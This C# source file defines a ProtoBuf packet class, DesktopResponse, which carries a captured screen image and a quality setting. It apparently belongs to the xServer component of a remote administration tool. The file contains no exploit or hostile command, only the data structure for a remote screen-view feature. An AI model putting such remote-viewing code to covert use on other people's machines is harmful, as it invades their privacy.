using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DesktopResponse : IPacket
    {
        [ProtoMember(1)]
        public byte[] Image { get; set; }

        [ProtoMember(2)]
        public int Quality { get; set; }

        public DesktopResponse() { }
        public DesktopResponse(byte[] image, int quality)
        {
            this.Image = image;
            this.Quality = quality;
        }

        public void Execute(Client client)
        {
            client.Send<DesktopResponse>(this);
        }
    }
}